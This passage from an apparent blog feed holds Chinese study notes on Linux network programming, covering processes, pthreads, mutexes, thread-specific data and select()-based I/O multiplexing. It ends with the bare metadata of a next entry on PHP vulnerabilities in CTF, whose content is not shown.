title="僵尸进程"></a>僵尸进程</h5><p>一个进程使用fork创建子进程，如果子进程退出，而父进程并没有调用<code>wait</code>或<code>waitpid</code>获取子进程的状态信息，那么子进程的进程描述符仍然保存在系统中。这种进程称之为僵尸进程。<br><strong>防止：</strong></p><ol><li>子进程正常或异常终止时向父进程发送SIGCHILD信号，父进程处理SIGCHILD信号。在信号处理函数中调用wait进行处理僵尸进程。</li><li>fork两次。原理是将子进程成为孤儿进程，从而其的父进程变为init进程，通过init进程可以处理僵尸进程。<h5 id="孤儿进程"><a href="#孤儿进程" class="headerlink" title="孤儿进程"></a>孤儿进程</h5>一个父进程退出，而它的一个或多个子进程还在运行，那么那些子进程将成为孤儿进程。孤儿进程将被init进程(进程号为1)所收养，并由init进程对它们完成状态收集工作。</li></ol><h3 id="线程"><a href="#线程" class="headerlink" title="线程"></a>线程</h3><h4 id="基本概念-1"><a href="#基本概念-1" class="headerlink" title="基本概念"></a>基本概念</h4><p>线程是进程内的独立执行实体和调度单元，又称为“轻量级”进程（lightwight process）；创建线程比进程快10~100倍。<br><img src="/2018/11/20/Linux网络编程基础/1542455365960.png" alt="Alt text"></p><h4 id="线程操作"><a href="#线程操作" class="headerlink" title="线程操作"></a>线程操作</h4><h5 id="创建线程"><a href="#创建线程" class="headerlink" title="创建线程"></a>创建线程</h5><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">pthread_create</span><span class="params">(<span class="keyword">pthread_t</span> *tid, <span class="keyword">const</span> <span class="keyword">pthread_attr_t</span> *attr, <span class="keyword">void</span> *(*func)(<span class="keyword">void</span> *), <span class="keyword">void</span> *arg)</span></span>;</span><br><span class="line"><span class="comment">//返回：成功时为0；出错时为正的Exxx值</span></span><br></pre></td></tr></table></figure><p><code>tid</code>:线程的id标识，<code>attr</code>:属性如优先级，是否是守护线程。<code>func</code>:线程的执行函数。<code>arg</code>:线程的调用参数。<br>常见的返回错误值：</p><ul><li>EAGAIN：超过了系统线程数目的限制。</li><li>ENOMEN：没有足够的内存产生新的线程。</li><li><p>EINVAL：无效的属性attr值。</p><h5 id="等待线程终止"><a href="#等待线程终止" class="headerlink" title="等待线程终止"></a>等待线程终止</h5><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#inlcude <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">pthread_join</span><span class="params">(<span class="keyword">pthread_t</span> tid, <span class="keyword">void</span> **status)</span></span>;</span><br><span class="line">      <span class="comment">//  返回：成功时为0；出错时为正的Exxx值，不设置error</span></span><br></pre></td></tr></table></figure><p>与<code>waitpid</code>函数类似，指定等待线程的ID。被等待线程必须是当前进程成员，且不是分离的线程和守护线程。</p><h5 id="分离线程"><a href="#分离线程" class="headerlink" title="分离线程"></a>分离线程</h5><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">pthread_detach</span><span class="params">(<span class="keyword">pthread_t</span> tid)</span></span></span><br><span class="line">            返回：成功时为0；出错时为正Exxx值；</span><br></pre></td></tr></table></figure></li></ul><p>线程分为可联合的(joinable)和分离的(detached)。前者终止时，线程ID和终止状态将保留，直到另外一个线程调用<code>pthread_join</code>。后者终止时释放所有资源。<br>此函数将指定线程设置为分离的。</p><h5 id="获取ID"><a href="#获取ID" class="headerlink" title="获取ID"></a>获取ID</h5><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="keyword">pthread_t</span> pthread_self(<span class="keyword">void</span>);</span><br><span class="line"><span class="comment">//返回调用函数的线程ID</span></span><br><span class="line">pthread_detach(pthread_self());<span class="comment">//将自己设为分离线程</span></span><br></pre></td></tr></table></figure><h5 id="终止线程"><a href="#终止线程" class="headerlink" title="终止线程"></a>终止线程</h5><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">pthread_exit</span><span class="params">(<span class="keyword">void</span> *status)</span></span>;</span><br><span class="line">                                      <span class="comment">//无返回值；</span></span><br></pre></td></tr></table></figure><p>指针<code>status</code>执行线程的退出状态。</p><p><strong>终止线程的三种方法：</strong></p><ol><li>调用<code>pthread_exit</code></li><li>启动线程的函数<code>pthread_create</code>的第三个参数，返回终止状态。</li><li>进程终止，线程随之终止。<h5 id="一次执行"><a href="#一次执行" class="headerlink" title="一次执行"></a>一次执行</h5><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">＃include &lt;pthread.h&gt;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">pthread_once</span><span class="params">(<span class="keyword">pthread_once_t</span> *once_control, <span class="keyword">void</span> (*init_routine) (<span class="keyword">void</span>))</span></span></span><br><span class="line"><span class="function">                                             <span class="comment">//   成功返回0，否则返回错误码</span></span></span><br></pre></td></tr></table></figure></li></ol><p>如果本函数中，<code>once_control</code>变量使用的初值为<code>PTHREAD_ONCE_INIT</code>，可保证<code>init_routine()</code>函数在本进程执行序列中仅执行一次。<br>LinuxThreads使用<strong>互斥锁</strong>和<strong>条件变量</strong>保证由<code>pthread_once()</code>指定的函数执行且仅执行一次，而<code>once_control</code>则表征是否执行过。如果<code>once_control</code>的初值不是<code>PTHREAD_ONCE_INIT</code>（LinuxThreads定义为0），<code>pthread_once()</code>的行为就会不正常; </p><h5 id="取消机制"><a href="#取消机制" class="headerlink" title="取消机制"></a>取消机制</h5><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">pthread_cancel</span><span class="params">(<span class="keyword">pthread_t</span> tid)</span></span>;</span><br><span class="line"><span class="comment">//返回：成功为0，失败非0</span></span><br></pre></td></tr></table></figure><p>线程通过向另外一个线程发送取消请求，接收到取消请求的线程根据其设置状态，作出：1）忽略该请求；2）立即终止自己；3） 延迟一段时间终止自己；</p><h4 id="给新线程传递参数的方法"><a href="#给新线程传递参数的方法" class="headerlink" title="给新线程传递参数的方法"></a>给新线程传递参数的方法</h4><p>由于同一个进程内的所有线程共享内存和变量，因此在传递参数时需作特殊处理，下面参考如下几种方法：</p><ul><li>传递参数的普通方法</li><li>通过指针传递参数</li><li>通过分配arg的空间来传递参数</li><li>还可以通过加锁等同步设施来实现传递参数</li></ul><h4 id="多线程并发服务器模板"><a href="#多线程并发服务器模板" class="headerlink" title="多线程并发服务器模板"></a>多线程并发服务器模板</h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">start_routine</span><span class="params">( <span class="keyword">void</span> *arg)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span>  </span>&#123;</span><br><span class="line"><span class="keyword">int</span>listenfd, connfd;</span><br><span class="line"><span class="keyword">pthread_t</span>tid;</span><br><span class="line">typearg;</span><br><span class="line"><span class="comment">/* Create TCP socket */</span></span><br><span class="line">……</span><br><span class="line"><span class="comment">/* Bind socket to address */</span></span><br><span class="line">……</span><br><span class="line"><span class="comment">/* Listen */</span></span><br><span class="line">……</span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>) &#123;</span><br><span class="line"><span class="comment">/* Accept connection */</span></span><br><span class="line"><span class="keyword">if</span> ((pthread_create(&amp;tid, <span class="literal">NULL</span>, start_routine, (<span class="keyword">void</span> *)&amp;arg)) </span><br><span class="line"><span class="comment">/* handle exception */</span></span><br><span class="line">……</span><br><span class="line">&#125;</span><br><span class="line">……</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="互斥锁"><a href="#互斥锁" class="headerlink" title="互斥锁"></a>互斥锁</h3><p>先看一段代码<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="keyword">int</span> myglobal=<span class="number">0</span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">thread_function</span><span class="params">(<span class="keyword">void</span> *arg)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> i,j;</span><br><span class="line"><span class="keyword">for</span> ( i=<span class="number">0</span>; i&lt;<span class="number">5</span>; i++) </span><br><span class="line">&#123;</span><br><span class="line">   j=myglobal;</span><br><span class="line">   j=j+<span class="number">1</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"."</span>);</span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line">    sleep(<span class="number">1</span>);</span><br><span class="line">    myglobal=j;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">     <span class="keyword">pthread_t</span> mythread;</span><br><span class="line">  <span class="keyword">int</span> i;</span><br><span class="line">  <span class="keyword">if</span> ( pthread_create( &amp;mythread, <span class="literal">NULL</span>, thread_function, <span class="literal">NULL</span>) ) </span><br><span class="line"> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"error creating thread."</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);  </span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">for</span> ( i=<span class="number">0</span>; i&lt;<span class="number">5</span>; i++) </span><br><span class="line"> &#123;</span><br><span class="line">    myglobal=myglobal+<span class="number">1</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"o"</span>);</span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line">    sleep(<span class="number">1</span>);  </span><br><span class="line"> &#125;</span><br><span class="line">  <span class="keyword">if</span> ( pthread_join ( mythread, <span class="literal">NULL</span> ) ) </span><br><span class="line"> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"error joining thread."</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">     <span class="built_in">printf</span>(<span class="string">"\nmyglobal equals %d\n"</span>,myglobal);</span><br><span class="line"> <span class="built_in">exit</span>(<span class="number">0</span>); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>运行结果：<br><img src="/2018/11/20/Linux网络编程基础/1542460021192.png" alt="Alt text"><br>主线程和新线程都将myglobal加1，一共累加10次。结果应是10,为什么是5?<br>答案：因为没有解决同步问题，最后退出的线程值确定全局变量的值。</p><p><strong>互斥锁</strong>用来保护线程代码中共享数据的完整性。</p><ul><li>操作系统将保证同时只有一个线程能成功完成对一个互斥锁的加锁操作。</li><li>如果一个线程已经对某一互斥锁进行了加锁，其他线程只有等待该线程完成对这一互斥锁解锁后，才能完成加锁操作。</li></ul><h4 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pthread_mutex_lock(<span class="keyword">pthread_mutex_t</span>  *mptr) </span><br><span class="line">                   <span class="comment">//返回：成功0，否则返回错误码</span></span><br></pre></td></tr></table></figure><p><code>mptr</code>:指向互斥锁的指针。<br>该函数接受一个指向互斥锁的指针作为参数并将其锁定。如果互斥锁已经被锁定，调用者将进入睡眠状态。函数返回时，将唤醒调用者。<br>如果互斥锁是静态分配的，就将mptr初始化为常值<code>PTHREAD_MUTEX_INITIALIZER</code>。<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pthread_mutex_unlock(<span class="keyword">pthread_mutex_t</span>  *mptr)</span><br><span class="line"><span class="comment">//返回：成功0.否则返回错误码</span></span><br></pre></td></tr></table></figure></p><p>用于互斥锁解锁操作。<br>改进后代码：<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="keyword">int</span> myglobal=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">pthread_mutex_t</span> mymutex=PTHREAD_MUTEX_INITIALIZER;</span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">thread_function</span><span class="params">(<span class="keyword">void</span> *arg)</span> </span>&#123;</span><br><span class="line"><span class="keyword">int</span> i,j;</span><br><span class="line"><span class="keyword">for</span> ( i=<span class="number">0</span>; i&lt;<span class="number">5</span>; i++) &#123;</span><br><span class="line">    pthread_mutex_lock(&amp;mymutex);</span><br><span class="line">    j=myglobal;</span><br><span class="line">    j=j+<span class="number">1</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"."</span>);</span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line">    sleep(<span class="number">1</span>);</span><br><span class="line">    myglobal=j;</span><br><span class="line">    pthread_mutex_unlock(&amp;mymutex);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line"><span class="keyword">pthread_t</span> mythread;</span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line"><span class="keyword">if</span> ( pthread_create( &amp;mythread, <span class="literal">NULL</span>, thread_function, <span class="literal">NULL</span>) ) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"error creating thread."</span>);</span><br><span class="line">    <span class="built_in">abort</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> ( i=<span class="number">0</span>; i&lt;<span class="number">5</span>; i++) &#123;</span><br><span class="line">    pthread_mutex_lock(&amp;mymutex);</span><br><span class="line">    myglobal=myglobal+<span class="number">1</span>;</span><br><span class="line">    pthread_mutex_unlock(&amp;mymutex);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"o"</span>);</span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line">    sleep(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line"><span class="keyword">if</span> ( pthread_join ( mythread, <span class="literal">NULL</span> ) ) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"error joining thread."</span>);</span><br><span class="line">    <span class="built_in">abort</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"\nmyglobal equals %d\n"</span>,myglobal);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><img src="/2018/11/20/Linux网络编程基础/1542461532095.png" alt="Alt text"></p><h2 id="线程安全性编程"><a href="#线程安全性编程" class="headerlink" title="线程安全性编程"></a>线程安全性编程</h2><p>在多线程环境中，应避免使用静态变量。在linux环境中，用线程专用数据TSD取代静态变量。它类似于全局数据，只不过它是线程私有的，是以线程为界限的。</p><p><strong>TSD是定义线程私有全局数据的唯一方法  </strong><br>每个TSD由进程内<strong>唯一的关键字(key)</strong>来标志，用来存取线程私有的数据。</p><h3 id="函数-1"><a href="#函数-1" class="headerlink" title="函数"></a>函数</h3><h4 id="分配函数"><a href="#分配函数" class="headerlink" title="分配函数"></a>分配函数</h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">pthread_key_create</span><span class="params">(<span class="keyword">pthread_key_t</span> *key, <span class="keyword">void</span> (* destrctor)(<span class="keyword">void</span> *value))</span></span>;</span><br><span class="line"><span class="comment">//返回：正常执行返回0，否则返回错误码</span></span><br></pre></td></tr></table></figure><p>该函数在进程内部分配一个标志TSD的关键字，关键字是进程内部唯一的，所有线程在创建时关键字值是NULL。每个进程只能调用一次。<br>key指向创建的关键字；destructor是一个可选的析构函数，用于每个线程<strong>终止</strong>时调用该析构函数。</p><h4 id="绑定函数"><a href="#绑定函数" class="headerlink" title="绑定函数"></a>绑定函数</h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">pthread_setspecific</span><span class="params">(<span class="keyword">pthread_key_t</span> key, <span class="keyword">const</span> <span class="keyword">void</span> *value)</span></span>;</span><br><span class="line"><span class="comment">//返回值：正常执行后返回0；否则返回正的错误码</span></span><br></pre></td></tr></table></figure><p>为TSD关键字绑定一个与本线程相关的值。</p><h4 id="获取值"><a href="#获取值" class="headerlink" title="获取值"></a>获取值</h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> * <span class="title">pthread_getspecific</span><span class="params">(<span class="keyword">pthread_key_t</span> key)</span></span>;</span><br><span class="line">   <span class="comment">// 返回值：正常执行后返回与调用线程相关的关键字所绑定的值，否则返回NULL。</span></span><br></pre></td></tr></table></figure><p>获得与调用线程相关的关键字所绑定的值。</p><h4 id="删除函数"><a href="#删除函数" class="headerlink" title="删除函数"></a>删除函数</h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">pthread_key_delete</span><span class="params">(<span class="keyword">pthread_key_t</span> key)</span></span>;</span><br><span class="line"><span class="comment">//返回值：成功为0，否则为非0；</span></span><br></pre></td></tr></table></figure><p>该函数删除进程内的TSD表示的关键字。该函数既不检查TSD是否有绑定值，也不调用该关键字的析构函数。</p><h2 id="I-O复用"><a href="#I-O复用" class="headerlink" title="I/O复用"></a>I/O复用</h2><h3 id="五个模型"><a href="#五个模型" class="headerlink" title="五个模型"></a>五个模型</h3><h4 id="阻塞I-O"><a href="#阻塞I-O" class="headerlink" title="阻塞I/O"></a>阻塞I/O</h4><p><img src="/2018/11/20/Linux网络编程基础/1542612916694.png" alt="Alt text"></p><h4 id="非阻塞I-O"><a href="#非阻塞I-O" class="headerlink" title="非阻塞I/O"></a>非阻塞I/O</h4><p><img src="/2018/11/20/Linux网络编程基础/1542613029620.png" alt="Alt text"><br>循环调用recvfrom，称为轮询，极为浪费CPU资源。当请求不成功会有错误返回。</p><h4 id="I-O复用-1"><a href="#I-O复用-1" class="headerlink" title="I/O复用"></a>I/O复用</h4><p><img src="/2018/11/20/Linux网络编程基础/1542626935078.png" alt="Alt text"><br>调用<code>select</code>或<code>poll</code>，并在该函数上阻塞。select的好处在于可以等待多个描述字准备好。</p><h4 id="信号驱动I-O"><a href="#信号驱动I-O" class="headerlink" title="信号驱动I/O"></a>信号驱动I/O</h4><p><img src="/2018/11/20/Linux网络编程基础/1542637800858.png" alt="Alt text"><br>等待数据报到达时，可以不阻塞。</p><h4 id="异步I-O"><a href="#异步I-O" class="headerlink" title="异步I/O"></a>异步I/O</h4><p><img src="/2018/11/20/Linux网络编程基础/1542679894410.png" alt="Alt text"><br>让内核启动操作，并在整个操作完成后通知。<br>异步i/o让与信号驱动i/o的区别是：后者是由内核通知我们何时可以启动一个i/o操作，而前者是由内核通知我们i/o操作何时完成。</p><h4 id="比较"><a href="#比较" class="headerlink" title="比较"></a>比较</h4><p><img src="/2018/11/20/Linux网络编程基础/1542679996329.png" alt="Alt text"></p><h3 id="同步与异步"><a href="#同步与异步" class="headerlink" title="同步与异步"></a>同步与异步</h3><ul><li>同步i/o操作引起请求进程阻塞，直到i/o操作完成；</li><li>异步i/o操作不引起请求进程阻塞；<br>只有最后一个异步I/O模型是异步I/O<h3 id="select函数"><a href="#select函数" class="headerlink" title="select函数"></a>select函数</h3><h4 id="函数体"><a href="#函数体" class="headerlink" title="函数体"></a>函数体</h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/select.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/time.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">select</span><span class="params">(<span class="keyword">int</span> maxfd, fd_set *readset, fd_set *writeset, fd_set *exceptset, <span class="keyword">const</span> struct timeval *timeout)</span></span>;</span><br><span class="line">       <span class="comment">//返回：准备好描述字的总数量，0－超时，-1－出错，大于0-总的位数</span></span><br></pre></td></tr></table></figure></li></ul><p>指示内核等待多个事件中的任意一个发生，并仅在一个或多个时间发生或经过指定时间时才唤醒进程。<br><code>timeval</code>结构体可以提供秒数和毫秒数成员。<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">timeval</span> &#123;</span></span><br><span class="line"><span class="keyword">long</span> tv_sec;<span class="comment">/* seconds */</span></span><br><span class="line"><span class="keyword">long</span>tv_usec;<span class="comment">/* microseconds */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>该函数有三种执行结果：</p><ol><li>永远等待下去：仅在有一个或以上描述字准备好i/o才返回，为此，我们将<code>timeout</code>设置为空指针。</li><li>等待固定时间：在有一个描述字准备好时返回，但不超过由<code>timeout</code>参数指定的秒数和微秒数。</li><li>根本不等待，检查描述字后立即返回，这称为轮询。这种情况下，<code>timeout</code>必须指向结构<code>timeval</code>，且定时器的值必须为0。<h4 id="参数说明"><a href="#参数说明" class="headerlink" title="参数说明"></a>参数说明</h4>参数<code>readset</code>, <code>writeset</code>, <code>execeptset</code>指定让内核测试读，写，异常条件的描述字。<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">void FD_ZERO(fd_set  *fdset); /* clear all bits in fdset 所有位设0*/</span><br><span class="line">void FD_SET(int fd, fd_set  *fdset); /* turn on the bit for fd in fdset fd位设1*/</span><br><span class="line">void FD_CLR(int fd, fd_set  *fdset);     /* turn off the bit for fd in fdset fd位设0*/</span><br><span class="line">int FD_ISSET(int fd, fd_set  *fdset);    /* is the bit for fd on in fdset 检测fd位是否为1*/</span><br></pre></td></tr></table></figure></li></ol><p>分配一个fd_set数据类型的描述字集，利用上面四个宏操作。<br>参数<code>maxfdp1</code>指定被测试的描述字的个数，它是被测试的<strong>最大描述字加1</strong>。</p><h4 id="套接字可读条件"><a href="#套接字可读条件" class="headerlink" title="套接字可读条件"></a>套接字可读条件</h4><ul><li>套接字接收缓冲区中的数据字节数大于等于套接字接收缓冲区限度的当前值，对于TCP/UDP默认值为1；</li><li>套接字是一个监听套接字且已完成的连接数为非0。</li><li>如果对方tcp发送一个FIN（对方进程终止），套接字就变为可读且read返回0;</li><li>有一个套接字错误待处理。<h4 id="套接字可写条件"><a href="#套接字可写条件" class="headerlink" title="套接字可写条件"></a>套接字可写条件</h4></li><li>套接字发送缓冲区的可用空间大于等于套接字发送缓冲区的限度的当前值；</li><li>套接字的写这一半关闭，对套接字的写将产生SIGPIPE信号；</li><li>有一个套接字错误待处理<h4 id="套接字异常条件"><a href="#套接字异常条件" class="headerlink" title="套接字异常条件"></a>套接字异常条件</h4></li><li>套接口带外数据的到达；</li><li>控制状态信息的存在；</li></ul><h4 id="实现I-O多路复用步骤"><a href="#实现I-O多路复用步骤" class="headerlink" title="实现I/O多路复用步骤"></a>实现I/O多路复用步骤</h4><ol><li>清空描述符集合；</li><li>建立需要监视的描述符与描述符集合的联系；</li><li>调用select（）函数；</li><li>检查所有需要监视的描述符，利用FD_ISSET宏判断是否已准备好；</li><li>对已准备好的描述符进行I/O操作。</li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;套接字编程&quot;&gt;&lt;a href=&quot;#套接字编程&quot; class=&quot;headerlink&quot; title=&quot;套接字编程&quot;&gt;&lt;/a&gt;套接字编程&lt;/h2&gt;&lt;p&gt; 套接字是一种网络API，用来开发网络程序。套接字接口提供一种进程间通信的方法，使得在相同或不同的主机上的进程能以相
      
    
    </summary>
    
    
      <category term="学习笔记" scheme="https://www.twosmi1e.com/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>CTF中的常见PHP漏洞</title>
    <link href="https://www.twosmi1e.com/2018/11/07/CTF%E4%B8%AD%E7%9A%84%E5%B8%B8%E8%A7%81PHP%E6%BC%8F%E6%B4%9E/"/>
    <id>https://www.twosmi1e.com/2018/11/07/CTF中的常见PHP漏洞/</id>
    <published>2018-11-07T13:05:05.000Z</published>
    <updated>2018-11-07T13:08:05.422Z</updated>
    
